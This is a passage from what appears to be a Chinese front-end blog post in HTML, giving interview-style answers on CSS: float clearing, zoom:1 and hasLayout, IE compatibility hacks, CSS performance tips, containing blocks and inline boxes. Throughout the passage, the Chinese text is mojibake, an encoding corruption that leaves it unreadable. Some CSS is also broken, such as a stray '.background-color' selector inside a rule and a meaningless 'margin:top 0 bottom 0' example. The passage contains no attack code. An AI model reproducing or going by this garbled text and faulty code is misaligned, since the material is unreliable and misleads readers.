class="headerlink" title="ä½¿ç”¨ clear å±æ€§æ¸…é™¤æµ®åŠ¨çš„åŸç†ï¼Ÿ"></a>ä½¿ç”¨ clear å±æ€§æ¸…é™¤æµ®åŠ¨çš„åŸç†ï¼Ÿ</h3><p>ä½¿ç”¨clearå±æ€§æ¸…é™¤æµ®åŠ¨ï¼Œå…¶è¯­æ³•å¦‚ä¸‹ï¼š</p><p><code>clear:none|left|right|both</code></p><p>å®˜æ–¹å¯¹clearå±æ€§çš„è§£é‡Šæ˜¯ï¼šâ€œå…ƒç´ ç›’å­çš„è¾¹ä¸èƒ½å’Œå‰é¢çš„æµ®åŠ¨å…ƒç´ ç›¸é‚»ã€‚â€ï¼Œæˆ‘ä»¬å¯¹å…ƒç´ è®¾ç½®clearå±æ€§æ˜¯ä¸ºäº†é¿å…æµ®åŠ¨å…ƒç´ å¯¹è¯¥å…ƒç´ çš„å½±å“ï¼Œè€Œä¸æ˜¯æ¸…é™¤æ‰æµ®åŠ¨ã€‚</p><p>è¿˜éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯clearå±æ€§æŒ‡çš„æ˜¯å…ƒç´ ç›’å­çš„è¾¹ä¸èƒ½å’Œå‰é¢çš„æµ®åŠ¨å…ƒç´ ç›¸é‚»ï¼Œæ³¨æ„è¿™é‡Œâ€œå‰é¢çš„â€3ä¸ªå­—ï¼Œä¹Ÿå°±æ˜¯clearå±æ€§å¯¹â€œåé¢çš„â€æµ®åŠ¨å…ƒç´ æ˜¯ä¸é—»ä¸é—®çš„ã€‚è€ƒè™‘åˆ°floatå±æ€§è¦ä¹ˆæ˜¯leftï¼Œè¦ä¹ˆæ˜¯rightï¼Œä¸å¯èƒ½åŒæ—¶å­˜åœ¨ï¼ŒåŒæ—¶ç”±äºclearå±æ€§å¯¹â€œåé¢çš„â€æµ®åŠ¨å…ƒç´ ä¸é—»ä¸é—®ï¼Œå› æ­¤ï¼Œå½“clear:leftæœ‰æ•ˆçš„æ—¶å€™ï¼Œclear:rightå¿…å®šæ— æ•ˆï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶clear:leftç­‰åŒäºè®¾ç½®clear:bothï¼›åŒæ ·åœ°ï¼Œclear:rightå¦‚æœæœ‰æ•ˆä¹Ÿæ˜¯ç­‰åŒäºè®¾ç½®clear:bothã€‚</p><p>ä¸€èˆ¬ä½¿ç”¨ä¼ªå…ƒç´ çš„æ–¹å¼æ¸…é™¤æµ®åŠ¨</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clear</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line"><span class="attribute">content</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="attribute">display</span>:table;//ä¹Ÿå¯ä»¥æ˜¯&#x27;block&#x27;ï¼Œæˆ–è€…æ˜¯&#x27;list-item&#x27;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clearå±æ€§åªæœ‰å—çº§å…ƒç´ æ‰æœ‰æ•ˆçš„ï¼Œè€Œ::afterç­‰ä¼ªå…ƒç´ é»˜è®¤éƒ½æ˜¯å†…è”æ°´å¹³ï¼Œè¿™å°±æ˜¯å€ŸåŠ©ä¼ªå…ƒç´ æ¸…é™¤æµ®åŠ¨å½±å“æ—¶éœ€è¦è®¾ç½®displayå±æ€§å€¼çš„åŸå› ã€‚</p><h3 id="zoom-1-çš„æ¸…é™¤æµ®åŠ¨åŸç†"><a href="#zoom-1-çš„æ¸…é™¤æµ®åŠ¨åŸç†" class="headerlink" title="zoom:1 çš„æ¸…é™¤æµ®åŠ¨åŸç†?"></a>zoom:1 çš„æ¸…é™¤æµ®åŠ¨åŸç†?</h3><p>æ¸…é™¤æµ®åŠ¨ï¼Œè§¦å‘hasLayoutï¼›<br>zoomå±æ€§æ˜¯IEæµè§ˆå™¨çš„ä¸“æœ‰å±æ€§ï¼Œå®ƒå¯ä»¥è®¾ç½®æˆ–æ£€ç´¢å¯¹è±¡çš„ç¼©æ”¾æ¯”ä¾‹ã€‚è§£å†³ieä¸‹æ¯”è¾ƒå¥‡è‘©çš„bugã€‚è­¬å¦‚å¤–è¾¹è·ï¼ˆmarginï¼‰çš„é‡å ï¼Œæµ®åŠ¨æ¸…é™¤ï¼Œè§¦å‘ieçš„haslayoutå±æ€§ç­‰ã€‚</p><p>æ¥é¾™å»è„‰å¤§æ¦‚å¦‚ä¸‹ï¼š<br>å½“è®¾ç½®äº†zoomçš„å€¼ä¹‹åï¼Œæ‰€è®¾ç½®çš„å…ƒç´ å°±ä¼šå°±ä¼šæ‰©å¤§æˆ–è€…ç¼©å°ï¼Œé«˜åº¦å®½åº¦å°±ä¼šé‡æ–°è®¡ç®—äº†ï¼Œè¿™é‡Œä¸€æ—¦æ”¹å˜zoomå€¼æ—¶å…¶å®ä¹Ÿä¼šå‘ç”Ÿé‡æ–°æ¸²æŸ“ï¼Œè¿ç”¨è¿™ä¸ªåŸç†ï¼Œä¹Ÿå°±è§£å†³äº†ieä¸‹å­å…ƒç´ æµ®åŠ¨æ—¶å€™çˆ¶å…ƒç´ ä¸éšç€è‡ªåŠ¨æ‰©å¤§çš„é—®é¢˜ã€‚</p><p>zoomå±æ€§æ˜¯IEæµè§ˆå™¨çš„ä¸“æœ‰å±æ€§ï¼Œç«ç‹å’Œè€ç‰ˆæœ¬çš„webkitæ ¸å¿ƒçš„æµè§ˆå™¨éƒ½ä¸æ”¯æŒè¿™ä¸ªå±æ€§ã€‚ç„¶è€Œï¼Œzoomç°åœ¨å·²ç»è¢«é€æ­¥æ ‡å‡†åŒ–ï¼Œå‡ºç°åœ¨CSS3.0è§„èŒƒè‰æ¡ˆä¸­ã€‚</p><p>ç›®å‰éieç”±äºä¸æ”¯æŒè¿™ä¸ªå±æ€§ï¼Œå®ƒä»¬åˆæ˜¯é€šè¿‡ä»€ä¹ˆå±æ€§æ¥å®ç°å…ƒç´ çš„ç¼©æ”¾å‘¢ï¼Ÿå¯ä»¥é€šè¿‡css3é‡Œé¢çš„åŠ¨ç”»å±æ€§scaleè¿›è¡Œç¼©æ”¾ã€‚</p><h3 id="è®¾ç½®å…ƒç´ æµ®åŠ¨åï¼Œè¯¥å…ƒç´ çš„displayå€¼ï¼Ÿ"><a href="#è®¾ç½®å…ƒç´ æµ®åŠ¨åï¼Œè¯¥å…ƒç´ çš„displayå€¼ï¼Ÿ" class="headerlink" title="è®¾ç½®å…ƒç´ æµ®åŠ¨åï¼Œè¯¥å…ƒç´ çš„displayå€¼ï¼Ÿ"></a>è®¾ç½®å…ƒç´ æµ®åŠ¨åï¼Œè¯¥å…ƒç´ çš„displayå€¼ï¼Ÿ</h3><p>è‡ªåŠ¨å˜æˆdisplay:block</p><h2 id="ç»å¸¸é‡åˆ°çš„æµè§ˆå™¨çš„å…¼å®¹æ€§æœ‰å“ªäº›ï¼ŸåŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Œå¸¸ç”¨-hack-çš„æŠ€å·§ï¼Ÿ"><a href="#ç»å¸¸é‡åˆ°çš„æµè§ˆå™¨çš„å…¼å®¹æ€§æœ‰å“ªäº›ï¼ŸåŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Œå¸¸ç”¨-hack-çš„æŠ€å·§ï¼Ÿ" class="headerlink" title="ç»å¸¸é‡åˆ°çš„æµè§ˆå™¨çš„å…¼å®¹æ€§æœ‰å“ªäº›ï¼ŸåŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Œå¸¸ç”¨ hack çš„æŠ€å·§ï¼Ÿ"></a>ç»å¸¸é‡åˆ°çš„æµè§ˆå™¨çš„å…¼å®¹æ€§æœ‰å“ªäº›ï¼ŸåŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Œå¸¸ç”¨ hack çš„æŠ€å·§ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰png24ä½çš„å›¾ç‰‡åœ¨iE6æµè§ˆå™¨ä¸Šå‡ºç°èƒŒæ™¯<br>è§£å†³æ–¹æ¡ˆï¼šåšæˆPNG8ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨ä¸€æ®µè„šæœ¬å¤„ç†ã€‚</p><p>ï¼ˆ2ï¼‰æµè§ˆå™¨é»˜è®¤çš„marginå’Œpaddingä¸åŒ<br>è§£å†³æ–¹æ¡ˆï¼šåŠ ä¸€ä¸ªå…¨å±€çš„*{margin:0;padding:0;}æ¥ç»Ÿä¸€ã€‚</p><p>ï¼ˆ3ï¼‰IE6åŒè¾¹è·bugï¼šåœ¨IE6ä¸‹ï¼Œå¦‚æœå¯¹å…ƒç´ è®¾ç½®äº†æµ®åŠ¨ï¼ŒåŒæ—¶åˆè®¾ç½®äº†margin-leftæˆ–margin-rightï¼Œmarginå€¼ä¼šåŠ å€ã€‚</p><p>#box{float:left;width:10px;margin:0 0 0 10px;}</p><p>è¿™ç§æƒ…å†µä¹‹ä¸‹IEä¼šäº§ç”Ÿ20pxçš„è·ç¦»<br>è§£å†³æ–¹æ¡ˆï¼šåœ¨floatçš„æ ‡ç­¾æ ·å¼æ§åˆ¶ä¸­åŠ å…¥_display:inline;å°†å…¶è½¬åŒ–ä¸ºè¡Œå†…å±æ€§ã€‚(_è¿™ä¸ªç¬¦å·åªæœ‰ie6ä¼šè¯†åˆ«)</p><p>ï¼ˆ4ï¼‰æ¸è¿›è¯†åˆ«çš„æ–¹å¼ï¼Œä»æ€»ä½“ä¸­é€æ¸æ’é™¤å±€éƒ¨ã€‚é¦–å…ˆï¼Œå·§å¦™çš„ä½¿ç”¨â€\9â€è¿™ä¸€æ ‡è®°ï¼Œå°†IEæ¸¸è§ˆå™¨ä»æ‰€æœ‰æƒ…å†µä¸­åˆ†ç¦»å‡ºæ¥ã€‚æ¥ç€ï¼Œå†æ¬¡ä½¿ç”¨â€+â€å°†IE8å’ŒIE7ã€IE6åˆ†ç¦»å¼€æ¥ï¼Œè¿™æ ·IE8å·²ç»ç‹¬ç«‹è¯†åˆ«ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.bb</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>:<span class="number">#f1ee18</span>;<span class="comment">/*æ‰€æœ‰è¯†åˆ«*/</span></span><br><span class="line"><span class="selector-class">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>;<span class="comment">/*IE6ã€7ã€8è¯†åˆ«*/</span></span><br><span class="line">+<span class="attribute">background-color</span>:<span class="number">#a200ff</span>;<span class="comment">/*IE6ã€7è¯†åˆ«*/</span></span><br><span class="line">_background-<span class="attribute">color</span>:<span class="number">#1e0bd1</span>;<span class="comment">/*IE6è¯†åˆ«*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰IEä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è·å–å¸¸è§„å±æ€§çš„æ–¹æ³•æ¥è·å–è‡ªå®šä¹‰å±æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨getAttribute()è·å–è‡ªå®šä¹‰å±æ€§ï¼›Firefoxä¸‹ï¼Œåªèƒ½ä½¿ç”¨getAttribute()è·å–è‡ªå®šä¹‰å±æ€§<br>è§£å†³æ–¹æ³•ï¼šç»Ÿä¸€é€šè¿‡getAttribute()è·å–è‡ªå®šä¹‰å±æ€§ã€‚</p><p>ï¼ˆ6ï¼‰IEä¸‹ï¼Œeventå¯¹è±¡æœ‰xã€yå±æ€§ï¼Œä½†æ˜¯æ²¡æœ‰pageXã€pageYå±æ€§;Firefoxä¸‹ï¼Œeventå¯¹è±¡æœ‰pageXã€pageYå±æ€§ï¼Œä½†æ˜¯æ²¡æœ‰xã€yå±æ€§ã€‚<br>è§£å†³æ–¹æ³•ï¼šï¼ˆæ¡ä»¶æ³¨é‡Šï¼‰ç¼ºç‚¹æ˜¯åœ¨IEæµè§ˆå™¨ä¸‹å¯èƒ½ä¼šå¢åŠ é¢å¤–çš„HTTPè¯·æ±‚æ•°ã€‚</p><p>ï¼ˆ7ï¼‰Chromeä¸­æ–‡ç•Œé¢ä¸‹é»˜è®¤ä¼šå°†å°äº12pxçš„æ–‡æœ¬å¼ºåˆ¶æŒ‰ç…§12pxæ˜¾ç¤º<br>è§£å†³æ–¹æ³•ï¼š</p><ul><li>å¯é€šè¿‡åŠ å…¥CSSå±æ€§-webkit-text-size-adjust:none;è§£å†³ã€‚ä½†æ˜¯ï¼Œåœ¨chrome<br>æ›´æ–°åˆ°27ç‰ˆæœ¬ä¹‹åå°±ä¸å¯ä»¥ç”¨äº†ã€‚</li><li>è¿˜å¯ä»¥ä½¿ç”¨-webkit-transform:scale(0.5);æ³¨æ„-webkit-transform:scale(0.75);<br>æ”¶ç¼©çš„æ˜¯æ•´ä¸ªspançš„å¤§å°ï¼Œè¿™æ—¶å€™ï¼Œå¿…é¡»è¦å°†spanè½¬æ¢æˆå—å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨displayï¼šblock/inline-block/â€¦ï¼›</li></ul><p>ï¼ˆ8ï¼‰è¶…é“¾æ¥è®¿é—®è¿‡åhoveræ ·å¼å°±ä¸å‡ºç°äº†ï¼Œè¢«ç‚¹å‡»è®¿é—®è¿‡çš„è¶…é“¾æ¥æ ·å¼ä¸å†å…·æœ‰hoverå’Œactiveäº†<br>è§£å†³æ–¹æ³•ï¼šæ”¹å˜CSSå±æ€§çš„æ’åˆ—é¡ºåºL-V-H-A</p><p>ï¼ˆ9ï¼‰æ€ªå¼‚æ¨¡å¼é—®é¢˜ï¼šæ¼å†™DTDå£°æ˜ï¼ŒFirefoxä»ç„¶ä¼šæŒ‰ç…§æ ‡å‡†æ¨¡å¼æ¥è§£æç½‘é¡µï¼Œä½†åœ¨IEä¸­ä¼šè§¦å‘æ€ªå¼‚æ¨¡<br>å¼ã€‚ä¸ºé¿å…æ€ªå¼‚æ¨¡å¼ç»™æˆ‘ä»¬å¸¦æ¥ä¸å¿…è¦çš„éº»çƒ¦ï¼Œæœ€å¥½å…»æˆä¹¦å†™DTDå£°æ˜çš„å¥½ä¹ æƒ¯ã€‚</p><h2 id="CSSä¼˜åŒ–ã€æé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ"><a href="#CSSä¼˜åŒ–ã€æé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="CSSä¼˜åŒ–ã€æé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ"></a>CSSä¼˜åŒ–ã€æé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ</h2><p><strong>åŠ è½½æ€§èƒ½ï¼š</strong></p><p>ï¼ˆ1ï¼‰csså‹ç¼©ï¼šå°†å†™å¥½çš„cssè¿›è¡Œæ‰“åŒ…å‹ç¼©ï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šçš„ä½“ç§¯ã€‚<br>ï¼ˆ2ï¼‰csså•ä¸€æ ·å¼ï¼šå½“éœ€è¦ä¸‹è¾¹è·å’Œå·¦è¾¹è·çš„æ—¶å€™ï¼Œå¾ˆå¤šæ—¶å€™é€‰æ‹©:margin:top 0 bottom 0;ä½†margin-bottom:bot<br>tom;margin-left:left;æ‰§è¡Œçš„æ•ˆç‡æ›´é«˜ã€‚<br>ï¼ˆ3ï¼‰å‡å°‘ä½¿ç”¨@import,è€Œå»ºè®®ä½¿ç”¨linkï¼Œå› ä¸ºåè€…åœ¨é¡µé¢åŠ è½½æ—¶ä¸€èµ·åŠ è½½ï¼Œå‰è€…æ˜¯ç­‰å¾…é¡µé¢åŠ è½½å®Œæˆä¹‹åå†è¿›è¡ŒåŠ è½½ã€‚</p><p><strong>é€‰æ‹©å™¨æ€§èƒ½ï¼š</strong></p><p>ï¼ˆ1ï¼‰å…³é”®é€‰æ‹©å™¨ï¼ˆkey selectorï¼‰ã€‚é€‰æ‹©å™¨çš„æœ€åé¢çš„éƒ¨åˆ†ä¸ºå…³é”®é€‰æ‹©å™¨ï¼ˆå³ç”¨æ¥åŒ¹é…ç›®æ ‡å…ƒç´ çš„éƒ¨åˆ†ï¼‰ã€‚CSSé€‰æ‹©ç¬¦æ˜¯ä»å³åˆ°å·¦è¿›è¡ŒåŒ¹é…çš„ã€‚å½“ä½¿ç”¨åä»£é€‰æ‹©å™¨çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šéå†æ‰€æœ‰å­å…ƒç´ æ¥ç¡®å®šæ˜¯å¦æ˜¯æŒ‡å®šçš„å…ƒç´ ç­‰ç­‰ï¼›</p><p>ï¼ˆ2ï¼‰å¦‚æœè§„åˆ™æ‹¥æœ‰IDé€‰æ‹©å™¨ä½œä¸ºå…¶å…³é”®é€‰æ‹©å™¨ï¼Œåˆ™ä¸è¦ä¸ºè§„åˆ™å¢åŠ æ ‡ç­¾ã€‚è¿‡æ»¤æ‰æ— å…³çš„è§„åˆ™ï¼ˆè¿™æ ·æ ·å¼ç³»ç»Ÿå°±ä¸ä¼šæµªè´¹æ—¶é—´å»åŒ¹é…å®ƒä»¬äº†ï¼‰ã€‚</p><p>ï¼ˆ3ï¼‰é¿å…ä½¿ç”¨é€šé…è§„åˆ™ï¼Œå¦‚*{}è®¡ç®—æ¬¡æ•°æƒŠäººï¼åªå¯¹éœ€è¦ç”¨åˆ°çš„å…ƒç´ è¿›è¡Œé€‰æ‹©ã€‚</p><p>ï¼ˆ4ï¼‰å°½é‡å°‘çš„å»å¯¹æ ‡ç­¾è¿›è¡Œé€‰æ‹©ï¼Œè€Œæ˜¯ç”¨classã€‚</p><p>ï¼ˆ5ï¼‰å°½é‡å°‘çš„å»ä½¿ç”¨åä»£é€‰æ‹©å™¨ï¼Œé™ä½é€‰æ‹©å™¨çš„æƒé‡å€¼ã€‚åä»£é€‰æ‹©å™¨çš„å¼€é”€æ˜¯æœ€é«˜çš„ï¼Œå°½é‡å°†é€‰æ‹©å™¨çš„æ·±åº¦é™åˆ°æœ€ä½ï¼Œæœ€é«˜ä¸è¦è¶…è¿‡ä¸‰å±‚ï¼Œæ›´å¤šçš„ä½¿ç”¨ç±»æ¥å…³è”æ¯ä¸€ä¸ªæ ‡ç­¾å…ƒç´ ã€‚</p><p>ï¼ˆ6ï¼‰äº†è§£å“ªäº›å±æ€§æ˜¯å¯ä»¥é€šè¿‡ç»§æ‰¿è€Œæ¥çš„ï¼Œç„¶åé¿å…å¯¹è¿™äº›å±æ€§é‡å¤æŒ‡å®šè§„åˆ™ã€‚</p><p><strong>æ¸²æŸ“æ€§èƒ½ï¼š</strong></p><p>ï¼ˆ1ï¼‰æ…é‡ä½¿ç”¨é«˜æ€§èƒ½å±æ€§ï¼šæµ®åŠ¨ã€å®šä½ã€‚</p><p>ï¼ˆ2ï¼‰å°½é‡å‡å°‘é¡µé¢é‡æ’ã€é‡ç»˜ã€‚</p><p>ï¼ˆ3ï¼‰å»é™¤ç©ºè§„åˆ™ï¼šï½›ï½ã€‚ç©ºè§„åˆ™çš„äº§ç”ŸåŸå› ä¸€èˆ¬æ¥è¯´æ˜¯ä¸ºäº†é¢„ç•™æ ·å¼ã€‚å»é™¤è¿™äº›ç©ºè§„åˆ™æ— ç–‘èƒ½å‡å°‘cssæ–‡æ¡£ä½“ç§¯ã€‚</p><p>ï¼ˆ4ï¼‰å±æ€§å€¼ä¸º0æ—¶ï¼Œä¸åŠ å•ä½ã€‚</p><p>ï¼ˆ5ï¼‰å±æ€§å€¼ä¸ºæµ®åŠ¨å°æ•°0.**ï¼Œå¯ä»¥çœç•¥å°æ•°ç‚¹ä¹‹å‰çš„0ã€‚</p><p>ï¼ˆ6ï¼‰æ ‡å‡†åŒ–å„ç§æµè§ˆå™¨å‰ç¼€ï¼šå¸¦æµè§ˆå™¨å‰ç¼€çš„åœ¨å‰ã€‚æ ‡å‡†å±æ€§åœ¨åã€‚</p><p>ï¼ˆ7ï¼‰ä¸ä½¿ç”¨@importå‰ç¼€ï¼Œå®ƒä¼šå½±å“cssçš„åŠ è½½é€Ÿåº¦ã€‚</p><p>ï¼ˆ8ï¼‰é€‰æ‹©å™¨ä¼˜åŒ–åµŒå¥—ï¼Œå°½é‡é¿å…å±‚çº§è¿‡æ·±ã€‚</p><p>ï¼ˆ9ï¼‰cssé›ªç¢§å›¾ï¼ŒåŒä¸€é¡µé¢ç›¸è¿‘éƒ¨åˆ†çš„å°å›¾æ ‡ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼Œå‡å°‘é¡µé¢çš„è¯·æ±‚æ¬¡æ•°ï¼Œä½†æ˜¯åŒæ—¶å›¾ç‰‡æœ¬èº«ä¼šå˜å¤§ï¼Œä½¿ç”¨æ—¶ï¼Œä¼˜åŠ£è€ƒè™‘æ¸…æ¥šï¼Œå†ä½¿ç”¨ã€‚</p><p>ï¼ˆ10ï¼‰æ­£ç¡®ä½¿ç”¨displayçš„å±æ€§ï¼Œç”±äºdisplayçš„ä½œç”¨ï¼ŒæŸäº›æ ·å¼ç»„åˆä¼šæ— æ•ˆï¼Œå¾’å¢æ ·å¼ä½“ç§¯çš„åŒæ—¶ä¹Ÿå½±å“è§£ææ€§èƒ½ã€‚</p><p>ï¼ˆ11ï¼‰ä¸æ»¥ç”¨webå­—ä½“ã€‚å¯¹äºä¸­æ–‡ç½‘ç«™æ¥è¯´WebFontså¯èƒ½å¾ˆé™Œç”Ÿï¼Œå›½å¤–å´å¾ˆæµè¡Œã€‚web fontsé€šå¸¸ä½“ç§¯åºå¤§ï¼Œè€Œä¸”ä¸€äº›æµè§ˆå™¨åœ¨ä¸‹è½½web fontsæ—¶ä¼šé˜»å¡é¡µé¢æ¸²æŸ“æŸä¼¤æ€§èƒ½ã€‚</p><p><strong>å¯ç»´æŠ¤æ€§ã€å¥å£®æ€§ï¼š</strong></p><p>ï¼ˆ1ï¼‰å°†å…·æœ‰ç›¸åŒå±æ€§çš„æ ·å¼æŠ½ç¦»å‡ºæ¥ï¼Œæ•´åˆå¹¶é€šè¿‡classåœ¨é¡µé¢ä¸­è¿›è¡Œä½¿ç”¨ï¼Œæé«˜cssçš„å¯ç»´æŠ¤æ€§ã€‚<br>ï¼ˆ2ï¼‰æ ·å¼ä¸å†…å®¹åˆ†ç¦»ï¼šå°†cssä»£ç å®šä¹‰åˆ°å¤–éƒ¨cssä¸­ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯åŒ…å«å—ï¼Œå¯¹äºåŒ…å«å—çš„ç†è§£"><a href="#ä»€ä¹ˆæ˜¯åŒ…å«å—ï¼Œå¯¹äºåŒ…å«å—çš„ç†è§£" class="headerlink" title="ä»€ä¹ˆæ˜¯åŒ…å«å—ï¼Œå¯¹äºåŒ…å«å—çš„ç†è§£?"></a>ä»€ä¹ˆæ˜¯åŒ…å«å—ï¼Œå¯¹äºåŒ…å«å—çš„ç†è§£?</h2><p>åŒ…å«å—ï¼ˆcontaining blockï¼‰å°±æ˜¯å…ƒç´ ç”¨æ¥è®¡ç®—å’Œå®šä½çš„ä¸€ä¸ªæ¡†ã€‚</p><p>ï¼ˆ1ï¼‰æ ¹å…ƒç´ ï¼ˆå¾ˆå¤šåœºæ™¯ä¸‹å¯ä»¥çœ‹æˆæ˜¯<html>ï¼‰è¢«ç§°ä¸ºâ€œåˆå§‹åŒ…å«å—â€ï¼Œå…¶å°ºå¯¸ç­‰åŒäºæµè§ˆå™¨å¯è§†çª—å£çš„å¤§å°ã€‚</p><p>ï¼ˆ2ï¼‰å¯¹äºå…¶ä»–å…ƒç´ ï¼Œå¦‚æœè¯¥å…ƒç´ çš„positionæ˜¯relativeæˆ–è€…staticï¼Œåˆ™â€œåŒ…å«å—â€ç”±å…¶æœ€è¿‘çš„å—å®¹å™¨ç¥–å…ˆç›’çš„content boxè¾¹ç•Œå½¢æˆã€‚</p><p>ï¼ˆ3ï¼‰å¦‚æœå…ƒç´ position:fixedï¼Œåˆ™â€œåŒ…å«å—â€æ˜¯â€œåˆå§‹åŒ…å«å—â€ã€‚</p><p>ï¼ˆ4ï¼‰å¦‚æœå…ƒç´ position:absoluteï¼Œåˆ™â€œåŒ…å«å—â€ç”±æœ€è¿‘çš„positionä¸ä¸ºstaticçš„ç¥–å…ˆå…ƒç´ å»ºç«‹ï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š</p><p>å¦‚æœè¯¥ç¥–å…ˆå…ƒç´ æ˜¯çº¯inlineå…ƒç´ ï¼Œåˆ™è§„åˆ™ç•¥å¤æ‚ï¼š</p><ul><li>å‡è®¾ç»™å†…è”å…ƒç´ çš„å‰åå„ç”Ÿæˆä¸€ä¸ªå®½åº¦ä¸º0çš„å†…è”ç›’å­ï¼ˆinline boxï¼‰ï¼Œåˆ™è¿™ä¸¤ä¸ªå†…è”ç›’å­çš„padding boxå¤–é¢çš„åŒ…å›´ç›’å°±æ˜¯å†…è”å…ƒç´ çš„â€œåŒ…å«å—â€ï¼›</li><li>å¦‚æœè¯¥å†…è”å…ƒç´ è¢«è·¨è¡Œåˆ†å‰²äº†ï¼Œé‚£ä¹ˆâ€œåŒ…å«å—â€æ˜¯æœªå®šä¹‰çš„ï¼Œä¹Ÿå°±æ˜¯CSS2.1è§„èŒƒå¹¶æ²¡æœ‰æ˜ç¡®å®šä¹‰ï¼Œæµè§ˆå™¨è‡ªè¡Œå‘æŒ¥å¦åˆ™ï¼Œâ€œåŒ…å«å—â€ç”±è¯¥ç¥–å…ˆçš„padding boxè¾¹ç•Œå½¢æˆã€‚</li></ul><p>å¦‚æœæ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„ç¥–å…ˆå…ƒç´ ï¼Œåˆ™â€œåŒ…å«å—â€æ˜¯â€œåˆå§‹åŒ…å«å—â€ã€‚</p><h2 id="å†…è”ç›’æ¨¡å‹åŸºæœ¬æ¦‚å¿µ"><a href="#å†…è”ç›’æ¨¡å‹åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å†…è”ç›’æ¨¡å‹åŸºæœ¬æ¦‚å¿µ"></a>å†…è”ç›’æ¨¡å‹åŸºæœ¬æ¦‚å¿µ</h2><p>ï¼ˆ1ï¼‰å†…å®¹åŒºåŸŸï¼ˆcontent areaï¼‰ã€‚å†…å®¹åŒºåŸŸæŒ‡ä¸€ç§å›´ç»•æ–‡å­—çœ‹ä¸è§çš„ç›’å­ï¼Œå…¶å¤§å°ä»…å—å­—ç¬¦æœ¬èº«ç‰¹æ€§æ§åˆ¶ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ç›’å­ï¼ˆcharacter boxï¼‰ï¼›ä½†æ˜¯æœ‰äº›å…ƒç´ ï¼Œå¦‚å›¾ç‰‡è¿™æ ·çš„æ›¿æ¢å…ƒç´ ï¼Œå…¶å†…å®¹æ˜¾ç„¶ä¸æ˜¯æ–‡å­—ï¼Œä¸å­˜åœ¨å­—ç¬¦ç›’å­ä¹‹ç±»çš„ï¼Œå› æ­¤ï¼Œå¯¹äºè¿™äº›å…ƒç´ ï¼Œå†…å®¹åŒºåŸŸå¯ä»¥çœ‹æˆå…ƒç´ è‡ªèº«ã€‚</p><p>ï¼ˆ2ï¼‰å†…è”ç›’å­ï¼ˆinline boxï¼‰ã€‚â€œå†…è”ç›’å­â€ä¸ä¼šè®©å†…å®¹æˆå—æ˜¾ç¤ºï¼Œè€Œæ˜¯æ’æˆä¸€è¡Œï¼Œè¿™é‡Œçš„â€œå†…è”ç›’å­â€å®é™…æŒ‡çš„å°±æ˜¯å…ƒç´ çš„â€œå¤–åœ¨ç›’å­â€ï¼Œç”¨æ¥å†³å®šå…ƒç´ æ˜¯å†…è”è¿˜æ˜¯å—çº§ã€‚è¯¥ç›’å­åˆå¯ä»¥ç»†åˆ†ä¸ºâ€œå†…è”ç›’å­â€å’Œâ€œåŒ¿åå†…è”ç›’å­â€ä¸¤ç±»ã€‚</p><p>ï¼ˆ3ï¼‰è¡Œæ¡†ç›’å­ï¼ˆline boxï¼‰ï¼Œæ¯ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªâ€œè¡Œæ¡†ç›’å­â€ï¼ˆå®çº¿æ¡†æ ‡æ³¨ï¼‰ï¼Œæ¯ä¸ªâ€œè¡Œæ¡†ç›’å­â€åˆæ˜¯ç”±ä¸€ä¸ªä¸€ä¸ªâ€œå†…è”ç›’å­â€ç»„æˆçš„ã€‚</p><p>ï¼ˆ4ï¼‰åŒ…å«å—ï¼ˆcontaining boxï¼‰ï¼Œç”±ä¸€è¡Œä¸€è¡Œçš„â€œè¡Œæ¡†ç›’å­â€ç»„æˆã€‚</p><h3 id="ä»€ä¹ˆæ˜¯å¹½çµç©ºç™½èŠ‚ç‚¹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å¹½çµç©ºç™½èŠ‚ç‚¹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å¹½çµç©ºç™½èŠ‚ç‚¹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å¹½çµç©ºç™½èŠ‚ç‚¹ï¼Ÿ</h3><p>â€œå¹½çµç©ºç™½èŠ‚ç‚¹â€æ˜¯å†…è”ç›’æ¨¡å‹ä¸­éå¸¸é‡è¦çš„ä¸€ä¸ªæ¦‚å¿µï¼Œå…·ä½“æŒ‡çš„æ˜¯ï¼šåœ¨HTML5æ–‡æ¡£å£°æ˜ä¸­ï¼Œå†…è”å…ƒç´ 